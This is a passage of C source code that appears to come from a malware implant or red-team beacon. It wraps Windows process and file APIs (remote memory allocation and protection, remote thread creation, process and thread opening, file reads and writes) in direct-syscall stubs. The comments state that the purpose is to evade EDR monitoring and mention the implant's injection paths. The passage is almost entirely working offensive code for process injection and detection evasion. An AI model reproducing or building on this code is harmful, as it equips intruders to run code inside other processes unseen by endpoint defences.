		return DuplicateHandle(hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions);
	attr = bInheritHandle ? 0x00000002 : 0; /* OBJ_INHERIT */
	st = sc_call_dup(hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, attr, dwOptions);
	return NT_SUCCESS(st);
#else
	return DuplicateHandle(hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions);
#endif
}

LPVOID beacon_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
#if defined(_M_X64)
	NTSTATUS st;
	PVOID base = lpAddress;
	SIZE_T size = dwSize;

	if (syscall_method_get() == 0)
		return VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
	st = sc_call_alloc(hProcess, &base, 0, &size, flAllocationType, flProtect);
	return NT_SUCCESS(st) ? base : NULL;
#else
	return VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
#endif
}

BOOL beacon_VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
#if defined(_M_X64)
	NTSTATUS st;
	PVOID base = lpAddress;
	SIZE_T size = dwSize;
	ULONG oldp = 0;

	if (syscall_method_get() == 0)
		return VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
	st = sc_call_protect(hProcess, &base, &size, flNewProtect, &oldp);
	if (lpflOldProtect)
		*lpflOldProtect = oldp;
	return NT_SUCCESS(st);
#else
	return VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
#endif
}

BOOL beacon_VirtualFreeEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) {
#if defined(_M_X64)
	NTSTATUS st;
	PVOID base = lpAddress;
	SIZE_T size = dwSize;

	if (syscall_method_get() == 0)
		return VirtualFreeEx(hProcess, lpAddress, dwSize, dwFreeType);
	st = sc_call_free(hProcess, &base, &size, dwFreeType);
	return NT_SUCCESS(st);
#else
	return VirtualFreeEx(hProcess, lpAddress, dwSize, dwFreeType);
#endif
}

HANDLE beacon_CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES sa, SIZE_T stack, LPTHREAD_START_ROUTINE start, LPVOID param, DWORD flags, LPDWORD outId) {
#if defined(_M_X64)
	NTSTATUS st;
	HANDLE th = NULL;

	if (syscall_method_get() == 0)
		return CreateRemoteThread(hProcess, sa, stack, start, param, flags, outId);
	st = sc_call_threadex(&th, 0x1FFFFF /* THREAD_ALL_ACCESS */, NULL, hProcess,
	                      (void *)start, param,
	                      flags & CREATE_SUSPENDED ? 1 : 0, /* CreateFlags: CREATE_SUSPENDED */
	                      0, stack ? stack : 0, 0, NULL);
	if (!NT_SUCCESS(st))
		return NULL;
	if (outId) {
		/* thread id via the handle: only queried lazily by callers that
		 * need it; none of our inject paths read outId */
		*outId = 0;
	}
	return th;
#else
	return CreateRemoteThread(hProcess, sa, stack, start, param, flags, outId);
#endif
}

/* ============ file/token family wrappers (round 22) ============ */

typedef struct { ULONG Length; HANDLE RootDirectory; void * ObjectName; ULONG Attributes; void * SecurityDescriptor; void * SecurityQualityOfService; } G3_OA;

#if defined(_M_X64)
typedef NTSTATUS(NTAPI *fn_NtOpenProcess)(PHANDLE, ACCESS_MASK, void *, void *);
typedef NTSTATUS(NTAPI *fn_NtOpenThread)(PHANDLE, ACCESS_MASK, void *, void *);
typedef NTSTATUS(NTAPI *fn_NtClose)(HANDLE);
typedef NTSTATUS(NTAPI *fn_NtReadFile)(HANDLE, HANDLE, void *, void *, void *, void *, ULONG, void *, void *);
typedef NTSTATUS(NTAPI *fn_NtWriteFile)(HANDLE, HANDLE, void *, void *, void *, void *, ULONG, void *, void *);

static NTSTATUS sc_call_openproc(PHANDLE out, ACCESS_MASK acc, void * oa, void * cid) {
	int m = syscall_method_get();
	fn_NtOpenProcess fn;
	if (m == 0 || !sc_openproc.ready)
		return ((fn_NtOpenProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcess"))(out, acc, oa, cid);
	fn = (fn_NtOpenProcess)make_exec(&sc_openproc, m == 2);
	if (fn == NULL)
		return ((fn_NtOpenProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcess"))(out, acc, oa, cid);
	return fn(out, acc, oa, cid);
}

static NTSTATUS sc_call_openthrd(PHANDLE out, ACCESS_MASK acc, void * oa, void * cid) {
	int m = syscall_method_get();
	fn_NtOpenThread fn;
	if (m == 0 || !sc_openthrd.ready)
		return ((fn_NtOpenThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenThread"))(out, acc, oa, cid);
	fn = (fn_NtOpenThread)make_exec(&sc_openthrd, m == 2);
	if (fn == NULL)
		return ((fn_NtOpenThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenThread"))(out, acc, oa, cid);
	return fn(out, acc, oa, cid);
}

static NTSTATUS sc_call_close(HANDLE h) {
	int m = syscall_method_get();
	fn_NtClose fn;
	if (m == 0 || !sc_close.ready)
		return ((fn_NtClose)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose"))(h);
	fn = (fn_NtClose)make_exec(&sc_close, m == 2);
	if (fn == NULL)
		return ((fn_NtClose)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose"))(h);
	return fn(h);
}

static NTSTATUS sc_call_readfile(HANDLE fh, HANDLE ev, void * apc, void * apcr, void * iosb, void * buf, ULONG len, void * boff, void * key) {
	int m = syscall_method_get();
	fn_NtReadFile fn;
	if (m == 0 || !sc_rfile.ready)
		return ((fn_NtReadFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadFile"))(fh, ev, apc, apcr, iosb, buf, len, boff, key);
	fn = (fn_NtReadFile)make_exec(&sc_rfile, m == 2);
	if (fn == NULL)
		return ((fn_NtReadFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadFile"))(fh, ev, apc, apcr, iosb, buf, len, boff, key);
	return fn(fh, ev, apc, apcr, iosb, buf, len, boff, key);
}

static NTSTATUS sc_call_writefile(HANDLE fh, HANDLE ev, void * apc, void * apcr, void * iosb, void * buf, ULONG len, void * boff, void * key) {
	int m = syscall_method_get();
	fn_NtWriteFile fn;
	if (m == 0 || !sc_wfile.ready)
		return ((fn_NtWriteFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteFile"))(fh, ev, apc, apcr, iosb, buf, len, boff, key);
	fn = (fn_NtWriteFile)make_exec(&sc_wfile, m == 2);
	if (fn == NULL)
		return ((fn_NtWriteFile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteFile"))(fh, ev, apc, apcr, iosb, buf, len, boff, key);
	return fn(fh, ev, apc, apcr, iosb, buf, len, boff, key);
}
#endif

HANDLE beacon_OpenProcess(DWORD access, BOOL inherit, DWORD pid) {
#if defined(_M_X64)
	G3_OA oa;
	struct { HANDLE pid; HANDLE tid; } cid;
	HANDLE h = NULL;
	NTSTATUS st;

	if (syscall_method_get() == 0)
		return OpenProcess(access, inherit, pid);
	memset(&oa, 0, sizeof(oa));
	oa.Length = sizeof(oa);
	memset(&cid, 0, sizeof(cid));
	cid.pid = (HANDLE)(ULONG_PTR)pid;
	st = sc_call_openproc(&h, access, &oa, &cid);
	return NT_SUCCESS(st) ? h : NULL;
#else
	return OpenProcess(access, inherit, pid);
#endif
}

HANDLE beacon_OpenThread(DWORD access, BOOL inherit, DWORD tid) {
#if defined(_M_X64)
	G3_OA oa;
	struct { HANDLE pid; HANDLE tid; } cid;
	HANDLE h = NULL;
	NTSTATUS st;

	if (syscall_method_get() == 0)
		return OpenThread(access, inherit, tid);
	memset(&oa, 0, sizeof(oa));
	oa.Length = sizeof(oa);
	memset(&cid, 0, sizeof(cid));
	cid.tid = (HANDLE)(ULONG_PTR)tid;
	st = sc_call_openthrd(&h, access, &oa, &cid);
	return NT_SUCCESS(st) ? h : NULL;
#else
	return OpenThread(access, inherit, tid);
#endif
}

BOOL beacon_CloseHandle(HANDLE h) {
#if defined(_M_X64)
	if (syscall_method_get() == 0)
		return CloseHandle(h);
	return NT_SUCCESS(sc_call_close(h));
#else
	return CloseHandle(h);
#endif
}

BOOL beacon_ReadFile(HANDLE h, LPVOID buf, DWORD toRead, LPDWORD got, LPOVERLAPPED ov) {
#if defined(_M_X64)
	/* IO_STATUS_BLOCK aligned like the ntdll contract */
	__declspec(align(8)) struct { LONG_PTR st; ULONG_PTR info; } iosb;
	NTSTATUS st;

	if (syscall_method_get() == 0)
		return ReadFile(h, buf, toRead, got, ov);
	st = sc_call_readfile(h, NULL, NULL, NULL, &iosb, buf, toRead,
	                      ov ? (void *)&ov->Offset : NULL, NULL);
	if (got)
		*got = (DWORD)iosb.info;
	if (st == 0x00000103) /* STATUS_PENDING with sync handle: the read is
	                       * queued; the caller waits on the handle */
		return FALSE;
	return NT_SUCCESS(st);
#else
	return ReadFile(h, buf, toRead, got, ov);
#endif
}

BOOL beacon_WriteFile(HANDLE h, LPCVOID buf, DWORD toWrite, LPDWORD wrote, LPOVERLAPPED ov) {
#if defined(_M_X64)
	__declspec(align(8)) struct { LONG_PTR st; ULONG_PTR info; } iosb;
	NTSTATUS st;

	if (syscall_method_get() == 0)
		return WriteFile(h, buf, toWrite, wrote, ov);
	st = sc_call_writefile(h, NULL, NULL, NULL, &iosb, (void *)buf, toWrite,
	                        ov ? (void *)&ov->Offset : NULL, NULL);
	if (wrote)
		*wrote = (DWORD)iosb.info;
	if (st == 0x00000103)
		return FALSE;
	return NT_SUCCESS(st);
#else
	return WriteFile(h, buf, toWrite, wrote, ov);
#endif
}

HANDLE beacon_CreateFileA(LPCSTR name, DWORD access, DWORD share, LPSECURITY_ATTRIBUTES sa, DWORD disp, DWORD flags, HANDLE tmpl) {
#if defined(_M_X64)
	/* NtCreateFile needs OBJECT_ATTRIBUTES + UNICODE_STRING; the Win32
	 * translation is non-trivial (RtlDosPathNameToNtPathName). Route
	 * through the plain API for now - CreateFileA is rarely a hot
	 * detection target (the read/write/close syscalls above carry the
	 * EDR-visible weight). Revisit if file-creation telemetry matters. */
	return CreateFileA(name, access, share, sa, disp, flags, tmpl);
#else
	return CreateFileA(name, access, share, sa, disp, flags, tmpl);
#endif
}
